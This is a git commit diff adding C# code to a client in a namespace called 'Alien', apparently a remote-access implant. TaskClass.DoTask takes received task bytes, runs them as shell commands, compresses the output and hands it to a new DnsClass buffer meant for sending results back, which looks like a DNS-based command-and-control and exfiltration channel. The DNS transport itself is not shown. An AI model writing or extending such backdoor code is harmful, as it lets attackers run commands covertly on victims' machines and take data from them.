18138ac3670111b99a11745c0c9337d491392e31
Kop <rolage@yandex.ru>
2022-12-05 19:30:44 +0300

    Added DoTask to perform cmd task Added Cmd class to execute received commands Added DnsClass to further widen it's request functionality

---
+++ client/client/DnsClass.cs
@@ -0,0 +1,26 @@
+﻿using System;
+using System.Linq;
+using System.Net;
+
+namespace Alien
+{
+	internal class DnsClass
+	{
+		public static void ReadySend(byte[] sendData)
+		{
+			DnsClass._SendByteIndex = 0;
+			DnsClass._SendDataSize = sendData.Length;
+			DnsClass._SendData = sendData;
+		}
+
+		
+		private static string _Domain;
+		private static int _Try;
+		private static int _ReceiveDataSize;
+		private static int _ReceiveByteIndex;
+		private static byte[] _ReceiveData;
+		private static int _SendDataSize;
+		private static int _SendByteIndex;
+		private static byte[] _SendData;
+	}
+}
--- client/client/TaskClass.cs
+++ client/client/TaskClass.cs
@@ -10,5 +10,59 @@ namespace Alien
 	internal class TaskClass
 	{
 		public static List<byte[]> ListData;
+
+		public static MachineCommand DoTask()
+		{
+			MachineCommand machineCommand = MachineCommand.Failed;
+			try
+			{
+				if (TaskClass.ListData.Count > 0 && TaskClass.ListData[0] != null)
+				{
+					byte[] array = TaskClass.ListData[0];
+					Enums.TaskType taskType = (Enums.TaskType)array[0];
+					byte[] array2 = array.Skip(1).ToArray<byte>();
+					byte[] resultData = null;
+					
+					string cmd = Encoding.UTF8.GetString(array2);
+					string text = cmd;		
+					string s2 = Cmd.ShrinkCmdResult(Cmd.ExecCmd(text));
+					resultData = Encoding.UTF8.GetBytes(s2);
+
+					if (resultData != null)
+					{
+						byte[] array3 = Deflate.Compress(resultData);
+						if (array3.Length < resultData.Length)
+						{
+							resultData = new byte[]
+							{
+								61
+							}.Concat(array3).ToArray<byte>();
+						}
+						else
+						{
+							resultData = new byte[]
+							{
+								57
+							}.Concat(resultData).ToArray<byte>();
+						}
+					}
+					byte[] array4 = new byte[(resultData == null) ? 0 : resultData.Length];
+					if (resultData != null)
+					{
+						Array.Copy(resultData, 0, array4, 0, resultData.Length);
+					}
+					TaskClass.ListData.RemoveAt(0);
+					machineCommand = MachineCommand.HasResult;
+					DnsClass.ReadySend(array4);
+				}
+			}
+			catch (Exception ex)
+			{
+				Util.Log(ex.ToString());
+				machineCommand = MachineCommand.Failed;
+			}
+			Util.Log(string.Format("DoTask : {0}", machineCommand));
+			return machineCommand;
+		}
 	}
 }
